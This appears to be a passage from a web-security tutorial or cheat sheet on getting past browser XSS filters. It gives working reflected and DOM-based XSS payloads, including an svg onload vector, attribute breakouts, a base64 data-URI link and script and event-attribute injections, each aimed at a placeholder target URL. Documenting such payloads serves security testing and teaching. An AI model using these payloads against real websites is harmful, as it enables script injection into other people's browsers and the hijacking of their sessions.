These filters try to protect users from XSS attacks but, they do not cover all possible XSS attack scenarios and only focuses on Reflected-type XSS.

One of the most common Reflected XSS vectors is the following, and it is detected by all main filters:
```html
<svg/onload=alert(1)>
```

Removing the final greater-than sign, we have a bypass for browsers running XSS Auditor.
## Injecting Inside HTML Tag Attributes
Another scenario is when it is possible to inject within HTML attributes:
```html
<div>
	Hello giuseppe"><svg/onload=alert(1)>
</div>
```

We can bypass WebKit with:
```txt
http://target-website.com/inject?x=giuseppe"><a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">clickhere<!--
```
## Injecting Inside script Tag
Often JavaScript variables are set with parameters from URL:
```txt
http://target-website.com/inject?x=giuseppe";alert(1);//
```
```html
<script>
	var x = "Injection";
</script>
```
## Injecting Inside Event Attributes
Event attributes are not inspected by native browser filters.
```txt
http://target-website.com/inject?roomID=alert(1)
```
```html
<button onclick="reserve(roomID);">
Reserve your sit!
</button>
```
## DOM-based
DOM based are not inspected by native browser filters.
```txt
http://target-website.com/inject?next=javascript:alert(1)
```
```html
<script>
...
var next = location.search.replace("?next=", "");
domEl.innerHTML = "<a href='"+next+"'>next page</a>";
```